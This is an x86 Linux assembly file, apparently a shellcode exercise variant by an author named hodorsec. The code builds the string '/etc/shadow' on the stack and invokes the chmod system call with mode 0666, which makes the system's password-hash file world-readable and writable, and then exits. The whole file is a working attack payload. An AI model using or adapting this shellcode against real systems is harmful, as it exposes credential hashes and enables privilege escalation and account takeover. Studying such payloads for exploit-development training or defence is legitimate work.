; Name; asm_linx86_chmod_sample2-alt2.asm
; Author hodorsec

global _start
section .text

_start:
	; Clear registers
	xor eax, eax			; Clearing for EAX
	mov ecx, eax			; Clear for ECX

	; String "/etc/shadow"
	push eax			; Push NULL in EAX on stack to terminate string
	push 0x776f6461 		; woda
	push 0x68732f2f 		; hs//
	push 0x6374652f 		; cte/

	; sys_chmod
	; int chmod(const char *path, mode_t mode);
	mov ebx, esp			; Store stack-pointer in EBX for pointer argument for path
	mov cx, 0x1b6			; Octal representation of 0666 for mode argument
	mov al, 0xf			; Put value for syscall 15 sys_chmod in AL (EAX)
	int 0x80			; Syscall

	; sys_exit
	; void exit(int status);
	xor eax, eax			; Clear EAX
	mov al, 1			; Copy 1 for exit
	int 0x80			; Syscall

